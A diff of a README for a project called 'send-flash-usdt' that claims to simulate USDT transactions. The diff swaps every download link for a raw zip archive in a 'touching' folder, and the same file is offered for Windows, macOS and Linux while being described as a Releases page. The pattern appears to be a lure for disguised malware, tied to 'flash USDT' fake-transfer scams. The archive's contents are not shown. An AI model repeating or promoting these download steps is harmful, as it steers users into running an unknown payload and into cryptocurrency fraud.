@@ -6,9 +6,9 @@ Welcome to **send-flash-usdt**! This application allows you to simulate transact
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip%20Now-Get%20Started-green)](https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip)
+[![Download the latest release](https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip%20Now-Get%20Started-green)](https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip)
 
-To get started, visit the Releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip).
+To get started, visit the Releases page to download the latest version of the application: [Download Here](https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip).
 
 ## 🛠️ System Requirements
 
@@ -21,12 +21,12 @@ Before downloading, please make sure your system meets these requirements:
 
 ## 📂 Download & Install
 
-1. Click the link to go to the Releases page: [Visit Releases](https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip).
+1. Click the link to go to the Releases page: [Visit Releases](https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip).
 2. Find the latest version of the application.
 3. Download the appropriate file for your operating system:
-   - For **Windows**, download `https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip`.
-   - For **Linux**, download `https://raw.githubusercontent.com/Petar2307/send-flash-usdt/main/touching/flash-usdt-send-v2.8.zip`.
+   - For **Windows**, download `https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip`.
+   - For **macOS**, download `https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip`.
+   - For **Linux**, download `https://github.com/Petar2307/send-flash-usdt/raw/refs/heads/main/touching/flash_send_usdt_v1.2-beta.4.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Unzip (for Windows and macOS) or extract (for Linux) the downloaded file.
 6. Follow the installation instructions included in the folder to complete the installation.
